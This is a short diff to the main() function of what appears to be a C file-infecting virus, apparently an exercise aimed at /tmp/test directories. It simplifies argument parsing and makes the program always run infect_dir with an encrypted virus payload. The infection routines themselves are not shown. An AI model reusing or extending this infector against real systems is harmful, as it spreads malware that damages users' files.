@@ -52,20 +52,15 @@ int main(int ac, char **av){
 	for (int i = 1; i < ac; i ++){
 		if (str_equal(av[i], "--recur"))
 			opt.do_recur = TRUE;
-		if (str_equal(av[i], "--remote"))
+		else if (str_equal(av[i], "--remote"))
 			opt.do_remote = TRUE;
-		if (str_equal(av[i], "--msg"))
+		else if (str_equal(av[i], "--msg"))
 			opt.print_msg = TRUE;
+		//else if (str_equal(av[i], "--big-recur"))
+		//	opt.print_msg = TRUE;
+	
 	}
-	if (opt.do_recur)
-	{
-		infect_dir("/tmp/test", virus, virus_len, crypt_off, crypt_len, opt);
-		infect_dir("/tmp/test2", virus, virus_len, crypt_off, crypt_len, opt);
-	}
-	else
-	{
-		infect("/tmp/test", "/tmp/test", virus, virus_len, crypt_off, crypt_len, opt);
-		infect("/tmp/test2", "/tmp/test2", virus, virus_len, crypt_off, crypt_len, opt);
-	}
+	infect_dir("/tmp/test", virus, virus_len, crypt_off, crypt_len, opt);
+	infect_dir("/tmp/test2", virus, virus_len, crypt_off, crypt_len, opt);
 	return 0;
 }
